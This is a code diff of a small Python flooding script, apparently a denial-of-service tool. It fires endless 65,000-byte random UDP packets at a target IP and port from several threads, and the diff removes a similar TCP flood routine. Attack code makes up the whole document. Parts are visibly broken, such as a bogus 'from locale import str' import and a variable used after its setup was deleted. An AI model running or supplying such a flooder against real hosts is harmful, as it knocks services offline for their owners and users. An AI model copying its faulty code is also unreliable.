@@ -1,26 +1,19 @@
-#!/usr/bin/env python3
-
+#!/usr/local/bin/python3
 import random
 import socket
 import threading
 from locale import str
 
-
-# ip = str("")
-# port = int(80)/
-# if hyperthreaeding = true, thread # = 2 x cores
-
-ip = "10.0.0.6"
+ip = "ENTER IP"
 port = 80
 choice = "UDP"
-times = 4
+times = 5
 threads = 4
 file_txt = open("attack_errors.txt", 'a')
 
 
 def floodUDP():
-    data = random._urandom(65565)
-    j = True
+    data = random._urandom(65000)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -31,39 +24,14 @@ def floodUDP():
                     file_txt.writelines("Sent packets.\n")
                     j = False
         except Exception as e:
-            file_txt.writelines(e)
-            file_txt.writelines("\n")
+            file_txt.write(str(e))
+            file_txt.write("\n")
             break
-
-
-def floodTCP():
-    data = random._urandom(16)
-    i = random.choice(("[*]", "[!]", "[#]"))
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(ip, port)
-            for x in range(times):
-                s.send(data)
-            print(i + "packets sent")
-        except:
-            print("Error")
 
 
 for y in range(threads):
     if(choice == "UDP"):
         th = threading.Thread(target=floodUDP)
         th.start()
-    elif(choice == "TCP"):
-        th = threading.Thread(target=floodTCP)
-        th.start()
     else:
         print("Wrong input given")
-
-
-"""
-if(j == True):
-print(i + " packets sent.")
-j = False
-
-"""
